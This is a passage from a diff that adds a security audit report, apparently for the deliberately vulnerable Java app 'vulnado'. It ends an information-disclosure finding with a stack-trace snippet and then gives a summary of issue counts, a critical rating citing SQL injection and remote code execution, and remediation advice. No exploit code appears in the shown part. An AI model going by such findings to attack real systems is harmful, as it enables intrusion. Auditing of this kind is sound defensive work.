+# at com.scalesec.vulnado.UserController.method(UserController.java:42)
+# Revealing code structure and potentially vulnerable frameworks
+```
+
+**Expected Result:** Detailed error information disclosed to attacker
+
+---
+
+## EXECUTIVE SUMMARY
+
+**Total Critical Issues:** 2  
+**Total High Issues:** 3  
+**Total Medium Issues:** 6  
+**Total Low Issues:** 1  
+
+**Risk Rating:** CRITICAL - Application contains multiple exploitable vulnerabilities allowing complete system compromise.
+
+**Recommendations:**
+1. Address SQL Injection and RCE vulnerabilities immediately
+2. Implement secure password hashing (bcrypt/Argon2)
+3. Add input validation and output encoding throughout
+4. Restrict CORS and add security headers
+5. Use HTTPOnly cookies for authentication tokens
+6. Implement rate limiting and account lockout
+7. Add comprehensive logging and monitoring
+8. Conduct security code review and penetration testing
+
+---
+
+**Report Generated:** April 16, 2026  
+**Auditor:** Security Analysis Tool  
+**Classification:** Confidential
